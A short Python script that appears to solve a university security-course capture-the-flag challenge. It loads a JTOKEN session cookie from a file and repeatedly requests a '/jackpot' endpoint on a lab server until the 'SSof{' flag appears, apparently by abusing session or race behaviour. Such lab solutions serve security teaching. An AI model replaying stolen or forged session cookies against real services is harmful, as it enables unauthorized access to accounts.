import requests

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/jackpot"

session = requests.session()

file = open("cookie_file.txt", "r")

file_content = file.readline()
#print("content", content)

cookies = {'JTOKEN': file_content}
#print(cookies)

i=40
while i>0:
    r = session.get(SERVER, cookies=cookies)
    print(session.cookies); #print(f'\ncookies : {r.cookies}')

    #just for eficiency
    if ( "SSof{" in r.text):
        print(r.text)
        break
    i-=1

